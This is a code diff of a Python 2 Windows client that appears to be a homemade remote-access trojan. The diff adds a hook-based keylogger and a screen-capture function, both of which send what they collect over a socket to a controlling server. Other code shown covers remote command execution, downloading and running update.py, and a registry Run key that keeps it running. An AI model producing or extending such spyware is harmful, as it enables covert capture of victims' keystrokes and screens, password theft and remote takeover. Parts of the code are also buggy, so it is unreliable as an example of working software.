@@ -4,12 +4,14 @@ import os
 import select
 import sys
 import winreg
-from threading import Thread, Timer
+from threading import Thread
 from time import sleep
 import pythoncom
 import pyHook
+from PIL import ImageGrab
 
-SERVER_IP = '127.0.0.1'
+
+SERVER_IP = '127.0.0.1' #  '10.0.0.1'  #
 SERVER_PORT = 2005
 KEY_ENTER = 13
 KEY_BACKSPACE = 8
@@ -20,28 +22,81 @@ REGISTRY_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
 main_socket = None
 hook_manager = None
+key_logger_thread = None
+key_logger_str = ''
+keep_key_logger = True
+
+
+def screenshot(params):
+    print 'params ', params
+    img = ImageGrab.grab()
+    img.save("client.png")
+
+
+    bytes = img.tobytes()
+
+    bytes_to_send = len(bytes)
+    main_socket.send('{img_size:010d}'.format(img_size=bytes_to_send))
+
+    main_socket.sendall(bytes)
+    main_socket.send('')
+    print("done")
+
+def key_logger(params):
+    global key_logger_thread
+    action = params[0]
+    if action == 'start':
+        key_logger_thread = Thread(target=key_logger_start, verbose=None)
+        key_logger_thread.start()
+        main_socket.send('{action} key logger'.format(action=action))
+        # sleep(20)
+        # key_logger_send_data()
+        # key_logger_stop()
+    elif action == 'stop':
+        key_logger_stop()
+        main_socket.send('{action} key logger'.format(action=action))
+    elif action == 'send':
+        key_logger_send_data()
+    else:
+        main_socket.send('wrong action "{action}" was received'.format(action=action))
+
+
+def key_logger_send_data():
+    print 'key_logger_str', key_logger_str
+    main_socket.send(key_logger_str)
 
 
 def key_logger_event(event):
     print chr(event.Ascii),
+    global key_logger_str
+    if len(key_logger_str) < SOCKET_RECV_BYTES:
+        key_logger_str += chr(event.Ascii)
 
 
-def key_logger_start(params):
+def key_logger_start():
+    try:
+        global hook_manager
+        if hook_manager is None:
+            hook_manager = pyHook.HookManager()
+            hook_manager.KeyDown = key_logger_event
+        hook_manager.HookKeyboard()
+        while True:
+        # while keep_key_logger:
+                pythoncom.PumpWaitingMessages()
+        # pythoncom.PumpMessages()
+    except Exception as e:
+        print 'Exception occurred in key_logger_start: ', e
+
+
+def key_logger_stop():
+    global keep_key_logger
     global hook_manager
-    if hook_manager is None:
-        hook_manager = pyHook.HookManager()
-        hook_manager.KeyDown = key_logger_event
-    hook_manager.HookKeyboard()
-    pythoncom.PumpMessages()
-
-
-def key_logger_stop(params):
     if hook_manager is not None:
-        hook_manager.UnHookKeyboard()
-    pythoncom.PumpWaitingMessages()
+        hook_manager.KeyDown = None
+        hook_manager = None
+    keep_key_logger = False
 
-
-def receive_file(params, file="update.py"):
+def receive_file(params, file):
     size_to_read = int(params[0])
     print 'file size = ', size_to_read
     with open(file, 'wb') as f:
@@ -56,19 +111,20 @@ def receive_file(params, file="update.py"):
 
         print "done"
 
-
 def run():
     # subprocess.call("python update.py")
     os.system('python update.py')
 
 
 def terminate(params):
-    print "realpath:", os.path.realpath(__file__)
+    global run
+
+    # print "realpath:", os.path.realpath(__file__)
     # os.remove(os.path.realpath(__file__))  # TODO: add it
     print 'exit!'
-    sys.exit()
+    # sys.exit()
+    run = False
     print 'exit??'
-
 
 def cmd(params):
     print 'client cmd mode'
@@ -171,7 +227,9 @@ action_dict = {
     2: cmd,  # attrib -h <file>, netstat -ano,  dir, ren <file>, move <file>
     3: open_socket,
     4: update_version,
-    5: change_socket
+    5: change_socket,
+    6: key_logger,
+    7: screenshot
 }
 
 
@@ -234,7 +292,7 @@ def main():
         # my_socket.send("0")
         # print(my_socket.recv(SOCKET_RECV_BYTES))
 
-        while True:
+        while run:
             rlist, wlist, xlist = select.select([main_socket] + socket_messages, [main_socket] + socket_messages, [])
             for sock in rlist:
                 if sock is main_socket:
